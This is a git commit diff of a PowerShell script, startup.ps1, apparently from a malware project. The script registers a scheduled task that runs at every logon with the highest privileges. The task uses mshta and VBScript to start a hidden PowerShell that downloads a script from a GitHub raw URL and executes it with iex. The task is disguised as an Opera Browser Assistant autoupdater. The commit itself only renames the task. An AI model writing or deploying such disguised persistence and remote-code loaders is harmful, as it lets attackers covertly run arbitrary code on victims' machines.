ddf7b601fbea699f3e830292bb9818fc0bffa7c0
43a1723 <hai1723notgay@gmail.com>
2024-06-13 17:23:34 +0700

    Update startup.ps1

--- startup.ps1
+++ startup.ps1
@@ -1,7 +1,7 @@
 $skid = "skid"
 $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$skid='$skid';iwr('https://raw.githubusercontent.com/43a1723/test/main/download.ps1')|iex`",0)(window.close)"
 $task_trigger = New-ScheduledTaskTrigger -AtLogOn
-$task_name = "Opera sckeduled assistant autoupdate 1717933175"
+$task_name = "sckeduled assistant autoupdate 1717933175"
 $task_desc = "Keeps Opera Browser Assistant up to date"
 $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
 Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description $task_desc -RunLevel Highest -Force | Out-Null
